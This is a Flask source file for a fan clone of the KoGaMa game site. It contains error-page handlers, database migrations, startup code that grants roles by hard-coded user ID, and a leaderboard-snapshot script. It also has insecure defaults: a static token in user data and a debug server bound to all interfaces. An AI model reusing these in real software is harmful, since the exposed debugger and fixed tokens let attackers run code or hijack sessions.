            "object_type_id": 1
        }
    return render_template('kagama.html', language=user_language, title=title, error_data=error_data, breadcrumb_data="null", submenu_data="null", object_data=object_data), 404

@app.errorhandler(401)
def unauthorized_attempt(e):
    title = "Unauthorized"
    error_data = json.dumps({'message': 'Unauthorized', 'code': 401}, indent=3)
    error_data = json.dumps(error_data)
    user_language = request.cookies.get('language', 'en_US')
    if current_user.is_authenticated:
        user_language = current_user.language
    object_data = {
       "ADSONPAGE": True,
       "category": None,
       "locale": user_language,
       "referrers": [
          {
             "referrer_id": 1,
             "name": "Kagama",
             "codename": "kogama",
             "urls": ""
          },
          {
             "referrer_id": 2,
             "name": "old_spilgames",
             "codename": "OldSpilGames",
             "urls": ""
          },
          {
             "referrer_id": 3,
             "name": "AdNPlay",
             "codename": "adnplay",
             "urls": ""
          },
          {
             "referrer_id": 4,
             "name": "GSM",
             "codename": "gsm",
             "urls": "games\\.poki\\.com|1001oyun\\.com|123pelit\\.com|gamesfreak\\.net|hrajhry\\.sk|jeuxjeuxjeux\\.ch|jeuxjeuxjeux\\.fr|megajatek\\.hu|megaspel\\.se|moiteigri\\.com|paisdelosjuegos\\.cl|paisdelosjuegos\\.co\\.ve|paisdelosjuegos\\.com\\.ar|paisdelosjuegos\\.com\\.co|paisdelosjuegos\\.com\\.do|paisdelosjuegos\\.com\\.ec|paisdelosjuegos\\.com\\.mx|paisdelosjuegos\\.com\\.pa|paisdelosjuegos\\.com\\.pe|paisdelosjuegos\\.com\\.uy|paisdelosjuegos\\.cr|paisdelosjuegos\\.es|poki\\.at|poki\\.be|poki\\.by|poki\\.cn|poki\\.co\\.il|poki\\.com|poki\\.com\\.br|poki\\.cz|poki\\.de|poki\\.dk|poki\\.gr|poki\\.it|poki\\.jp|poki\\.nl|poki\\.no|poki\\.pl|poki\\.pt|poki\\.ro|spielyeti\\.ch|trochoi\\.net"
          },
          {
             "referrer_id": 5,
             "name": "Miniplay",
             "codename": "miniplay",
             "urls": "minijuegos\\.com|miniplay\\.com|minigiochi\\.com|minijogos\\.com\\.br|minijuegos\\.es|minijuegosgratis\\.com"
          },
          {
             "referrer_id": 6,
             "name": "ORANGE",
             "codename": "orange",
             "urls": "kizi\\.com|yepi\\.com|bgames\\.com|huz\\.com|spele\\.nl|spele\\.be|keygames\\.com|oyungemisi\\.com|spielspiele\\.de|spelletjesoverzicht\\.nl|games\\.co\\.za|spiels\\.at|spiels\\.ch|kilitoyun\\.com|hryhry\\.net|starbie\\.nl|starbie\\.co\\.uk|minigioco\\.it|pelaaleikkia\\.com|jouerjouer\\.com|clavejuegos\\.com|1001igry\\.ru|m\\.1001igry\\.ru|nyckelspel\\.se|waznygry\\.pl|jogojogar\\.com|youdagames\\.com|zigiz\\.com|stratego\\.com|gembly\\.com|cadajogo\\.cocadajogo\\.com|cadajuego\\.es|funny-games\\.co\\.uk|m\\.funny-games\\.co\\.uk|funnygames\\.asia|funnygames\\.at|funnygames\\.be|funnygames\\.befr|funnygames\\.biz|funnygames\\.ch|funnygames\\.cn|funnygames\\.co\\.id|funnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.dk|funnygames\\.es|funnygames\\.eu|funnygames\\.fi|funnygames\\.fr|funnygames\\.gr|funnygames\\.hu|funnygames\\.ie|funnygames\\.in|funnygames\\.ir|funnygames\\.it|funnygames\\.jp|funnygames\\.kr|funnygames\\.lt|funnygames\\.nl|funnygames\\.no|funnygames\\.org|funnygames\\.ph|funnygames\\.pk|funnygames\\.pl|funnygames\\.pt|funnygames\\.ro|funnygames\\.ru|funnygames\\.se|funnygames\\.us|funnygames\\.vn|misjuegos\\.com|m\\.misjuegos\\.com"
          },
          {
             "referrer_id": 7,
             "name": "CRAZYGAMES",
             "codename": "crazygames",
             "urls": "crazygames\\.com|1001juegos\\.com|gioca\\.re|speelspelletjes\\.nl|onlinegame\\.co\\.id"
          },
          {
             "referrer_id": 8,
             "name": "SpilGames",
             "codename": "spilgames",
             "urls": "cdn\\.gameplayer\\.io|a10\\.com|girlsgogames\\.com|girlsgogames\\.ru|juegosdechicas\\.com|gry\\.pl|juegos\\.com|girlsgogames\\.fr|oyunskor\\.com|girlsgogames\\.pl|girlsgogames\\.co\\.uk|girlsgogames\\.com\\.br|girlsgogames\\.it|agame\\.com|girlsgogames\\.de|games\\.co\\.id|girlsgogames\\.nl|jeux\\.fr|girlsgogames\\.co\\.id|jeu\\.fr|spel\\.nl|flashgames\\.ru|girlsgogames\\.com\\.tr|gioco\\.it|zapjuegos\\.com|spelletjes\\.nl|spielen\\.com|ourgames\\.ru|girlsgogames\\.se|gamesgames\\.com|jetztspielen\\.de|ojogos\\.com\\.br|ojogos\\.pt|spela\\.se|giochi\\.it|spel\\.se|oyunoyna\\.com|games\\.co\\.uk|permainan\\.co\\.id"
          }
       ],
       "ads_data": {
          "host": "www.kogama.com",
          "ref": 1,
          "consent": True,
          "name": "Google AdManager (old account)",
          "ads": {
             "top_banner": {
                "num": "0",
                "id": "kogama_mobile_leaderboard_1",
                "ad_unit_code": "leaderboard",
                "sizes": "[728, 90]",
                "huge_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "big_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes": "[[728, 90],[468, 60]]",
                "small_sizes": "[[320, 50], [300, 50]]"
             },
             "skyscraper_left": {
                "num": "1",
                "id": "kogama-skyscraper-left",
                "ad_unit_code": "skyscraper_left",
                "sizes": "[160, 600]"
             },
             "skyscraper_right": {
                "num": "2",
                "id": "kogama-skyscraper-right",
                "ad_unit_code": "skyscraper",
                "sizes": "[160, 600]"
             },
             "bottom_banner": {
                "num": "4",
                "id": "kogama_mobile_leaderboard_2",
                "ad_unit_code": "leaderboard_bottom",
                "sizes": "[728, 90]",
                "huge_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "big_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes": "[[728, 90],[468, 60]]",
                "small_sizes": "[[320, 50], [300, 50]]"
             },
             "comment_ad": {
                "num": "5",
                "id": "kogama_rectangle",
                "ad_unit_code": "rectangle",
                "sizes": "[300, 250]"
             },
             "wide_skyscraper": {
                "num": "3",
                "id": "kogama-wide-skyscraper",
                "ad_unit_code": "wide_skyscraper",
                "sizes": "[300, 600]"
             },
             "game_list_banner": {
                "num": "6",
                "id": "kogama_mobile_game_list_banner",
                "ad_unit_code": "game_list_banner",
                "sizes": "[728, 90]",
                "huge_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "big_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes": "[[728, 90],[468, 60]]",
                "small_sizes": "[[320, 50], [300, 50]]"
             }
          },
          "network_code": "46278883"
       }
    }
    if current_user.is_authenticated:
        object_data["current_user"] = {
            "gold": current_user.gold,
            "is_child": _safe_is_child(current_user.birthdate),
            "leaderboard_rank": current_user.rank,
            "birthdate_update_required": False,
            "language": user_language,
            "used_free_week_elite": 0,
            "is_subscriber_on_hold": False,
            "xp": current_user.xp,
            "subscription": None,
            "cookie_policy_accepted_version": 2,
            "level_images": get_level_images(current_user._level),
            "silver": 0,
            "gdpr_limited_age": False,
            "username": current_user.username,
            "is_me": True,
            "email": current_user.email or "",
            "level": current_user.level,
            "description": current_user.description,
            "is_anonymous": False,
            "cookie_policy_accept_required": False,
            "next_level_xp": current_user.next_level_xp,
            "birthdate": current_user.birthdate,
            "id": current_user.id,
            "token": "f2b15971-fdeb-4482-a832-34ae74aff958",
            "created": current_user.created.isoformat() if current_user.created else None,
            "level_progress": current_user.level_progress,
            "previous_level_xp": current_user.previous_level_xp,
            "images": current_user.AVATAR_IMAGES_MAP.get(current_user.avatar_id, {}),
            "email_confirmed": current_user.email_confirmed,
            "xp_to_next_level": current_user.xp_to_next_level,
            "friends_limit": 999,
            "notifications": 0,
            "is_subscriber": False,
            "is_active": True,
            "is_authenticated": True,
            "role": current_user.role,
            "is_admin": current_user.role in ('admin', 'mod', 'staff'),
            "object_type_id": 1
        }
    return render_template('kagama.html', language=user_language, title=title, error_data=error_data, breadcrumb_data="null", submenu_data="null", object_data=object_data), 401

@app.errorhandler(500)
def internal_server_error(e):
    title = "Internal server error"
    error_data = json.dumps({'message': 'Internal server error', 'code': 500}, indent=3)
    error_data = json.dumps(error_data)
    user_language = request.cookies.get('language', 'en_US')
    if current_user.is_authenticated:
        user_language = current_user.language
    object_data = {
       "ADSONPAGE": True,
       "category": None,
       "locale": user_language,
       "referrers": [
          {
             "referrer_id": 1,
             "name": "Kagama",
             "codename": "kogama",
             "urls": ""
          },
          {
             "referrer_id": 2,
             "name": "old_spilgames",
             "codename": "OldSpilGames",
             "urls": ""
          },
          {
             "referrer_id": 3,
             "name": "AdNPlay",
             "codename": "adnplay",
             "urls": ""
          },
          {
             "referrer_id": 4,
             "name": "GSM",
             "codename": "gsm",
             "urls": "games\\.poki\\.com|1001oyun\\.com|123pelit\\.com|gamesfreak\\.net|hrajhry\\.sk|jeuxjeuxjeux\\.ch|jeuxjeuxjeux\\.fr|megajatek\\.hu|megaspel\\.se|moiteigri\\.com|paisdelosjuegos\\.cl|paisdelosjuegos\\.co\\.ve|paisdelosjuegos\\.com\\.ar|paisdelosjuegos\\.com\\.co|paisdelosjuegos\\.com\\.do|paisdelosjuegos\\.com\\.ec|paisdelosjuegos\\.com\\.mx|paisdelosjuegos\\.com\\.pa|paisdelosjuegos\\.com\\.pe|paisdelosjuegos\\.com\\.uy|paisdelosjuegos\\.cr|paisdelosjuegos\\.es|poki\\.at|poki\\.be|poki\\.by|poki\\.cn|poki\\.co\\.il|poki\\.com|poki\\.com\\.br|poki\\.cz|poki\\.de|poki\\.dk|poki\\.gr|poki\\.it|poki\\.jp|poki\\.nl|poki\\.no|poki\\.pl|poki\\.pt|poki\\.ro|spielyeti\\.ch|trochoi\\.net"
          },
          {
             "referrer_id": 5,
             "name": "Miniplay",
             "codename": "miniplay",
             "urls": "minijuegos\\.com|miniplay\\.com|minigiochi\\.com|minijogos\\.com\\.br|minijuegos\\.es|minijuegosgratis\\.com"
          },
          {
             "referrer_id": 6,
             "name": "ORANGE",
             "codename": "orange",
             "urls": "kizi\\.com|yepi\\.com|bgames\\.com|huz\\.com|spele\\.nl|spele\\.be|keygames\\.com|oyungemisi\\.com|spielspiele\\.de|spelletjesoverzicht\\.nl|games\\.co\\.za|spiels\\.at|spiels\\.ch|kilitoyun\\.com|hryhry\\.net|starbie\\.nl|starbie\\.co\\.uk|minigioco\\.it|pelaaleikkia\\.com|jouerjouer\\.com|clavejuegos\\.com|1001igry\\.ru|m\\.1001igry\\.ru|nyckelspel\\.se|waznygry\\.pl|jogojogar\\.com|youdagames\\.com|zigiz\\.com|stratego\\.com|gembly\\.com|cadajogo\\.cocadajogo\\.com|cadajuego\\.es|funny-games\\.co\\.uk|m\\.funny-games\\.co\\.uk|funnygames\\.asia|funnygames\\.at|funnygames\\.be|funnygames\\.befr|funnygames\\.biz|funnygames\\.ch|funnygames\\.cn|funnygames\\.co\\.id|funnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.dk|funnygames\\.es|funnygames\\.eu|funnygames\\.fi|funnygames\\.fr|funnygames\\.gr|funnygames\\.hu|funnygames\\.ie|funnygames\\.in|funnygames\\.ir|funnygames\\.it|funnygames\\.jp|funnygames\\.kr|funnygames\\.lt|funnygames\\.nl|funnygames\\.no|funnygames\\.org|funnygames\\.ph|funnygames\\.pk|funnygames\\.pl|funnygames\\.pt|funnygames\\.ro|funnygames\\.ru|funnygames\\.se|funnygames\\.us|funnygames\\.vn|misjuegos\\.com|m\\.misjuegos\\.com"
          },
          {
             "referrer_id": 7,
             "name": "CRAZYGAMES",
             "codename": "crazygames",
             "urls": "crazygames\\.com|1001juegos\\.com|gioca\\.re|speelspelletjes\\.nl|onlinegame\\.co\\.id"
          },
          {
             "referrer_id": 8,
             "name": "SpilGames",
             "codename": "spilgames",
             "urls": "cdn\\.gameplayer\\.io|a10\\.com|girlsgogames\\.com|girlsgogames\\.ru|juegosdechicas\\.com|gry\\.pl|juegos\\.com|girlsgogames\\.fr|oyunskor\\.com|girlsgogames\\.pl|girlsgogames\\.co\\.uk|girlsgogames\\.com\\.br|girlsgogames\\.it|agame\\.com|girlsgogames\\.de|games\\.co\\.id|girlsgogames\\.nl|jeux\\.fr|girlsgogames\\.co\\.id|jeu\\.fr|spel\\.nl|flashgames\\.ru|girlsgogames\\.com\\.tr|gioco\\.it|zapjuegos\\.com|spelletjes\\.nl|spielen\\.com|ourgames\\.ru|girlsgogames\\.se|gamesgames\\.com|jetztspielen\\.de|ojogos\\.com\\.br|ojogos\\.pt|spela\\.se|giochi\\.it|spel\\.se|oyunoyna\\.com|games\\.co\\.uk|permainan\\.co\\.id"
          }
       ],
       "ads_data": {
          "host": "www.kogama.com",
          "ref": 1,
          "consent": True,
          "name": "Google AdManager (old account)",
          "ads": {
             "top_banner": {
                "num": "0",
                "id": "kogama_mobile_leaderboard_1",
                "ad_unit_code": "leaderboard",
                "sizes": "[728, 90]",
                "huge_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "big_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes": "[[728, 90],[468, 60]]",
                "small_sizes": "[[320, 50], [300, 50]]"
             },
             "skyscraper_left": {
                "num": "1",
                "id": "kogama-skyscraper-left",
                "ad_unit_code": "skyscraper_left",
                "sizes": "[160, 600]"
             },
             "skyscraper_right": {
                "num": "2",
                "id": "kogama-skyscraper-right",
                "ad_unit_code": "skyscraper",
                "sizes": "[160, 600]"
             },
             "bottom_banner": {
                "num": "4",
                "id": "kogama_mobile_leaderboard_2",
                "ad_unit_code": "leaderboard_bottom",
                "sizes": "[728, 90]",
                "huge_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "big_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes": "[[728, 90],[468, 60]]",
                "small_sizes": "[[320, 50], [300, 50]]"
             },
             "comment_ad": {
                "num": "5",
                "id": "kogama_rectangle",
                "ad_unit_code": "rectangle",
                "sizes": "[300, 250]"
             },
             "wide_skyscraper": {
                "num": "3",
                "id": "kogama-wide-skyscraper",
                "ad_unit_code": "wide_skyscraper",
                "sizes": "[300, 600]"
             },
             "game_list_banner": {
                "num": "6",
                "id": "kogama_mobile_game_list_banner",
                "ad_unit_code": "game_list_banner",
                "sizes": "[728, 90]",
                "huge_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "big_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes": "[[728, 90],[468, 60]]",
                "small_sizes": "[[320, 50], [300, 50]]"
             }
          },
          "network_code": "46278883"
       }
    }
    if current_user.is_authenticated:
        object_data["current_user"] = {
            "gold": current_user.gold,
            "is_child": _safe_is_child(current_user.birthdate),
            "leaderboard_rank": current_user.rank,
            "birthdate_update_required": False,
            "language": user_language,
            "used_free_week_elite": 0,
            "is_subscriber_on_hold": False,
            "xp": current_user.xp,
            "subscription": None,
            "cookie_policy_accepted_version": 2,
            "level_images": get_level_images(current_user._level),
            "silver": 0,
            "gdpr_limited_age": False,
            "username": current_user.username,
            "is_me": True,
            "email": current_user.email or "",
            "level": current_user.level,
            "description": current_user.description,
            "is_anonymous": False,
            "cookie_policy_accept_required": False,
            "next_level_xp": current_user.next_level_xp,
            "birthdate": current_user.birthdate,
            "id": current_user.id,
            "token": "f2b15971-fdeb-4482-a832-erdffdrecfdcd",
            "created": current_user.created.isoformat() if current_user.created else None,
            "level_progress": current_user.level_progress,
            "previous_level_xp": current_user.previous_level_xp,
            "images": current_user.AVATAR_IMAGES_MAP.get(current_user.avatar_id, {}),
            "email_confirmed": current_user.email_confirmed,
            "xp_to_next_level": current_user.xp_to_next_level,
            "friends_limit": 999,
            "notifications": 0,
            "is_subscriber": False,
            "is_active": True,
            "is_authenticated": True,
            "role": current_user.role,
            "is_admin": current_user.role in ('admin', 'mod', 'staff'),
            "object_type_id": 1
        }
    return render_template('kagama.html', language=user_language, title=title, error_data=error_data, breadcrumb_data="null", submenu_data="null", object_data=object_data), 500

@app.errorhandler(429)
def ratelimit_handler(e):
    return jsonify({
        'error': {
            '__all__': [f"You are doing this too much, try again later."]
        }
    }), 429

def ensure_discord_columns():
    existing_columns = {
        row[1] for row in db.session.execute(text('PRAGMA table_info("user")')).fetchall()
    }
    column_statements = {
        "discord_id": 'ALTER TABLE "user" ADD COLUMN discord_id VARCHAR(64)',
        "discord_username": 'ALTER TABLE "user" ADD COLUMN discord_username VARCHAR(150)',
        "discord_avatar_hash": 'ALTER TABLE "user" ADD COLUMN discord_avatar_hash VARCHAR(150)',
        "discord_avatar_url": 'ALTER TABLE "user" ADD COLUMN discord_avatar_url VARCHAR(300)',
        "discord_verified_at": 'ALTER TABLE "user" ADD COLUMN discord_verified_at DATETIME',
        "role": 'ALTER TABLE "user" ADD COLUMN role VARCHAR(20) DEFAULT \'user\''
    }
    for column_name, statement in column_statements.items():
        if column_name not in existing_columns:
            db.session.execute(text(statement))
    db.session.execute(text('CREATE UNIQUE INDEX IF NOT EXISTS ix_user_discord_id ON "user" (discord_id)'))
    db.session.commit()

def migrate_news_feed():
    cols = {row[1] for row in db.session.execute(text('PRAGMA table_info("news_feed")')).fetchall()}
    if 'is_published' in cols:
        return
    db.session.execute(text('''CREATE TABLE news_feed_new (
        id INTEGER PRIMARY KEY,
        profile_id INTEGER NOT NULL,
        profile_username VARCHAR(150) NOT NULL,
        title TEXT NOT NULL,
        excerpt TEXT NOT NULL,
        body_html TEXT NOT NULL,
        created DATETIME NOT NULL,
        updated DATETIME,
        language VARCHAR(150) NOT NULL,
        published DATETIME NOT NULL,
        is_published BOOLEAN DEFAULT 1,
        is_pinned BOOLEAN DEFAULT 0,
        is_archived BOOLEAN DEFAULT 0,
        scheduled_publish_at DATETIME,
        featured_images TEXT NOT NULL
    )'''))
    db.session.execute(text('''INSERT INTO news_feed_new
        (id, profile_id, profile_username, title, excerpt, body_html, created, updated,
         language, published, is_published, is_pinned, is_archived, scheduled_publish_at, featured_images)
        SELECT id, profile_id, profile_username, title, excerpt, body_html, created, updated,
         language, published, 1, 0, 0, NULL, featured_images FROM news_feed'''))
    db.session.execute(text('DROP TABLE news_feed'))
    db.session.execute(text('ALTER TABLE news_feed_new RENAME TO news_feed'))
    db.session.commit()


def migrate_news_support_image():
    cols = {row[1] for row in db.session.execute(text('PRAGMA table_info("news_feed")')).fetchall()}
    if 'support_image' not in cols:
        db.session.execute(text('ALTER TABLE news_feed ADD COLUMN support_image TEXT'))
        db.session.commit()


USER_NEW_COLUMNS = {
    "session_version": "ALTER TABLE \"user\" ADD COLUMN session_version INTEGER DEFAULT 1",
    "is_elite": "ALTER TABLE \"user\" ADD COLUMN is_elite BOOLEAN DEFAULT 0",
    "two_factor_enabled": "ALTER TABLE \"user\" ADD COLUMN two_factor_enabled BOOLEAN DEFAULT 0",
    "locked": "ALTER TABLE \"user\" ADD COLUMN locked BOOLEAN DEFAULT 0",
    "suspended": "ALTER TABLE \"user\" ADD COLUMN suspended BOOLEAN DEFAULT 0",
    "muted_until": "ALTER TABLE \"user\" ADD COLUMN muted_until DATETIME",
    "shadow_banned": "ALTER TABLE \"user\" ADD COLUMN shadow_banned BOOLEAN DEFAULT 0",
    "warned_count": "ALTER TABLE \"user\" ADD COLUMN warned_count INTEGER DEFAULT 0",
    "staff_role": "ALTER TABLE \"user\" ADD COLUMN staff_role VARCHAR(30)",
    "custom_permissions": "ALTER TABLE \"user\" ADD COLUMN custom_permissions TEXT",
    "ip_allowlist": "ALTER TABLE \"user\" ADD COLUMN ip_allowlist TEXT",
    "last_login": "ALTER TABLE \"user\" ADD COLUMN last_login DATETIME",
    "login_ip": "ALTER TABLE \"user\" ADD COLUMN login_ip VARCHAR(64)",
     "display_name": "ALTER TABLE \"user\" ADD COLUMN display_name VARCHAR(150)",
     "admin_notes": "ALTER TABLE \"user\" ADD COLUMN admin_notes TEXT",
}


def migrate_user_columns():
    existing = {row[1] for row in db.session.execute(text('PRAGMA table_info("user")')).fetchall()}
    for col, stmt in USER_NEW_COLUMNS.items():
        if col not in existing:
            db.session.execute(text(stmt))
    db.session.commit()


def avatar_images_for(avatar_id):
    # Always return a non-empty avatar image dict (fallback to Block Boy)
    imgs = User.AVATAR_IMAGES_MAP.get(avatar_id)
    if not imgs:
        imgs = User.AVATAR_IMAGES_MAP.get(17873)
    return imgs or {}


REPORT_NEW_COLUMNS = {
    "details": "ALTER TABLE reports ADD COLUMN details TEXT",
    "evidence_url": "ALTER TABLE reports ADD COLUMN evidence_url VARCHAR(500)",
    "contact_reporter": "ALTER TABLE reports ADD COLUMN contact_reporter BOOLEAN DEFAULT 0",
}


def migrate_reports_columns():
    existing = {row[1] for row in db.session.execute(text('PRAGMA table_info("reports")')).fetchall()}
    for col, stmt in REPORT_NEW_COLUMNS.items():
        if col not in existing:
            db.session.execute(text(stmt))
    db.session.commit()


def reset_last_ping():
    # Make "online" count + last-seen real.
    # Accounts that never logged in -> last_ping epoch => SPA shows "Never seen".
    # Accounts that did log in -> backfill last_ping from last_login (real last-seen).
    # NOTE: Use naive UTC datetimes — SQLite cannot handle tz-aware datetimes in raw SQL.
    epoch = datetime(1970, 1, 1)
    db.session.execute(text('UPDATE "user" SET last_ping = :e WHERE last_login IS NULL'), {'e': epoch})
    db.session.execute(text(
        'UPDATE "user" SET last_ping = last_login '
        'WHERE last_login IS NOT NULL AND last_ping <= :cutoff'
    ), {'cutoff': datetime(1971, 1, 1)})
    db.session.commit()


def ensure_admin_roles():
    ronman = db.session.get(User, 1)
    if ronman and ronman.role != 'owner':
        ronman.role = 'owner'
        db.session.commit()
    for uid in [2, 4, 7]:
        u = db.session.get(User, uid)
        if u and u.role == 'user':
            u.role = 'mod'
            db.session.commit()

def ensure_ronman_alt():
    user = User.query.filter(User.username.ilike('RonmanAlt')).first()
    if not user:
        print('[init] RonmanAlt not found - skipping elite/framer grant')
        return
    changed = False
    if user.role != 'elite':
        user.role = 'elite'
        changed = True
    badge = Badge.query.filter_by(name='Framer').first()
    if not badge:
        badge = Badge(name='Framer', icon_url='', rarity='rare', is_exclusive=True)
        db.session.add(badge)
        db.session.flush()
    has = UserBadge.query.filter_by(user_id=user.id, badge_id=badge.id).first()
    if not has:
        db.session.add(UserBadge(user_id=user.id, badge_id=badge.id, awarded_by=user.id, note='Framer status'))
        changed = True
    if changed:
        db.session.commit()
        print('[init] RonmanAlt granted elite role + Framer badge')


def format_time_left(td):
    days = td.days
    hours = td.seconds // 3600
    parts = []
    if days > 0:
        parts.append(f"{days} day{'s' if days != 1 else ''}")
    if hours > 0:
        parts.append(f"{hours} hour{'s' if hours != 1 else ''}")
    return " and ".join(parts) if parts else "less than an hour"

with app.app_context():
    db.create_all()
    _ensure_perf_indexes()
    ensure_discord_columns()
    migrate_news_feed()
    migrate_news_support_image()
    migrate_user_columns()
    migrate_reports_columns()
    reset_last_ping()
    ensure_admin_roles()
    ensure_ronman_alt()

START_TIME = datetime.now(timezone.utc)

# ==================================================
#  KaGaMa LEADERBOARD SNAPSHOT CAPTURE (formerly _capture.py)
#  Captures the archived kogama.com/leaderboard page via headless
#  Chromium (Playwright) and saves a rendered HTML + screenshot into
#  <project>/snapshot/leaderboard/.
#  Usage:  python flask_app_fullclone_backup.py capture
# ==================================================
def capture_kogama_leaderboard_snapshot(out_dir="/home/bob/Downloads/KaGaMa Project/snapshot/leaderboard"):
    import time
    from pathlib import Path
    from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout

    OUT = Path(out_dir)
    OUT.mkdir(parents=True, exist_ok=True)
    URL = "https://web.archive.org/web/20250117142950mp_/https://www.kogama.com/leaderboard/"

    def capture(browser, url, label):
        page = browser.new_page(viewport={"width": 1280, "height": 2400})
        errors = []
        page.on("console", lambda m: errors.append(m.text) if m.type == "error" else None)
        try:
            page.goto(url, wait_until="domcontentloaded", timeout=60000)
        except PWTimeout:
            print(f"[{label}] goto timeout, continuing")
        rendered = False
        try:
            page.wait_for_function(
                "document.querySelector('#root') && document.querySelector('#root').children.length > 0",
                timeout=45000,
            )
            rendered = True
        except PWTimeout:
            print(f"[{label}] #root did not populate in time")
        time.sleep(5)
        try:
            page.evaluate("window.scrollTo(0, document.body.scrollHeight)")
        except Exception:
            pass
        time.sleep(3)
        html = page.content()
        shot = OUT / f"leaderboard_{label}.png"
        try:
            page.screenshot(path=str(shot), full_page=True)
        except Exception as e:
            print(f"[{label}] screenshot error: {e}")
            shot = None
        page.close()
        return html, shot, rendered, errors

    with sync_playwright() as p:
        browser = p.chromium.launch()
        html, shot, rendered, errors = capture(browser, URL, "mp")
        browser.close()

        (OUT / "leaderboard.html").write_text(html, encoding="utf-8")
        print("rendered:", rendered)
        print("html bytes:", len(html))
        print("screenshot:", shot, (shot.stat().st_size if shot and shot.exists() else 0), "bytes")
        for e in errors[:5]:
            print("  -", e[:200])
        for marker in ["leaderboard", "rank", "user", "Level"]:
            print(f"contains '{marker}':", marker.lower() in html.lower())


# ==================================================
#  RUN THE APP (optional, if not using gunicorn)
# ==================================================
if __name__ == '__main__':
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == "capture":
        capture_kogama_leaderboard_snapshot()
    else:
        app.run(debug=True, host='0.0.0.0', port=5000)


